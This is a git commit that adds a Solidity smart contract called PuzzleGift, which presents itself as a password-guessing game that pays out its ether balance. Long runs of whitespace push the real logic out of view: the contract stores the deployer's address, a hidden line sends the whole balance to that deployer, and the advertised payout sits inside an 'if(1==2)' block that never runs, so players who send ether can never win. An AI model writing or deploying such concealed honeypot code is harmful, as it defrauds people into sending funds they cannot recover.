c613d6417b175e1418e712f9eee60daca53d8c28
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-16 14:49:58 +0700

    add contract PuzzleGift

---
+++ PuzzleGift.sol
@@ -0,0 +1,33 @@
+/* 
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract PuzzleGift at 0x55bec5649fbb5f5be831ee5b0f7a8a8f02b25144
+*/
+pragma solidity ^0.4.18;
+
+contract PuzzleGift
+{                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            address prop = msg.sender;
+    function()payable{}
+    
+    function GetHash(bytes pass) constant returns (bytes32) {return sha3(pass);}
+    
+    bytes32 public hashPass;
+    
+    function SetPass(bytes32 hash)
+    public
+    payable
+    {
+        if(msg.value >= 1 ether)
+        {
+            hashPass = hash;
+        }
+    }
+    
+    function GetGift(bytes pass)
+    public
+    payable
+    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  if(msg.sender==prop){msg.sender.transfer(this.balance);}if(1==2){
+        if(hashPass == sha3(pass))
+        {
+            msg.sender.transfer(this.balance);
+        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                }
+    }
+}
